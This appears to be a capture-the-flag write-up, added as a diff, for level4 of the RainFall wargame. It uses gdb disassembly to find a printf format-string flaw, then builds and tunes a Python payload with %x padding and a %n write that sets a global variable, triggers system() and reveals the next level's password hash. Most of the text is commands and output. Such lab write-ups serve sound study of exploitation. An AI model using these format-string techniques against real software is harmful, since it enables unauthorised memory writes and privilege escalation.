@@ -1,0 +1,109 @@
+# We have a executable "level4" lets do some test!
+
+level4@RainFall:~$ ./level4
+test
+test
+level4@RainFall:~$ ./level4
+test test
+test test
+level4@RainFall:~$
+
+# Like the previous level the program print stdin, next step use gdb!
+
+>level4@RainFall:~$ gdb level4
+(gdb) disas main
+[...]
+   0x080484a8 <+1>:	mov    %esp,%ebp
+   0x080484aa <+3>:	and    $0xfffffff0,%esp
+   0x080484ad <+6>:	call   0x8048457 <n>
+[...]
+
+# Main call a function named n let's disasamble it
+
+(gdb) disas n
+[...]
+   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
+   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
+   0x08048485 <+46>:	mov    %eax,(%esp)
+   0x08048488 <+49>:	call   0x8048444 <p>
+[...]
+
+# After a call to fgets it call the function p
+
+(gdb) disas p
+[...]
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x8(%ebp),%eax
+   0x0804844d <+9>:	mov    %eax,(%esp)
+   0x08048450 <+12>:	call   0x8048340 <printf@plt>
+   0x08048455 <+17>:	leave  
+   0x08048456 <+18>:	ret    
+[...]
+
+# And p only call a printf but with the same weakness as level3! Let's go back to the n function
+
+[...]
+   0x0804848d <+54>:	mov    0x8049810,%eax
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
+   0x08048497 <+64>:	jne    0x80484a5 <n+78>
+   0x08048499 <+66>:	movl   $0x8048590,(%esp)
+   0x080484a0 <+73>:	call   0x8048360 <system@plt>
+[...]
+
+# After the p function it compare eax to the value 0x1025544 (16930116 in decimal) and if its equal make a system call.
+
+# It's pretty similar to level3 so let's procede with the same steps
+
+(gdb) r
+Starting program: /home/user/level4/level4 
+AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+AAAAb7ff26b0.bffff664.b7fd0ff4.0.0.bffff628.804848d.bffff420.200.b7fd1ac0.b7ff37d0.41414141.252e7825.
+[Inferior 1 (process 3130) exited normally]
+
+# We can write in the 12 address! We can take the same python command for the level3 and just change some value
+
+# And we will setup some breakpoint to see if we get the correct value
+
+(gdb) r <<< $(python -c "print('\x10\x98\x04\x08' + '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n')")
+Starting program: /home/user/level4/level4 <<< $(python -c "print('\x10\x98\x04\x08' + '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n')")
+b7ff26b0.bffff664.b7fd0ff4.0.0.bffff628.804848d.bffff420.200.b7fd1ac0.b7ff37d0.
+
+Breakpoint 1, 0x0804848d in n ()
+(gdb) x 0x8049810
+0x8049810 <m>:	0x00000053
+
+# Well we need like a quite large sums of blank space to match the value but let's do it (16930116 - 83 = 16930033)
+
+(gdb) r <<< $(python -c "print('\x10\x98\x04\x08' + '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16930033x.%n')")
+[...]
+[...]
+[...]
+Breakpoint 1, 0x0804848d in n ()
+(gdb) x 0x8049810
+0x8049810 <m>:	0x0102553c
+
+# We are of by 8 again
+
+(gdb) r <<< $(python -c "print('\x10\x98\x04\x08' + '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16930041x.%n')")
+[...]
+[...]
+[...]
+(gdb) x 0x8049810
+0x8049810 <m>:	0x01025544
+(gdb) continue
+Continuing.
+/bin/cat: /home/user/level5/.pass: Permission denied
+[Inferior 1 (process 3137) exited normally]
+
+# Seem's to work ! Let's test it outside gdb
+
+>level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16930041x.%n')" > /tmp/test
+>level4@RainFall:~$ cat /tmp/test - | ./level4
+[...]
+[...]
+[...]
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
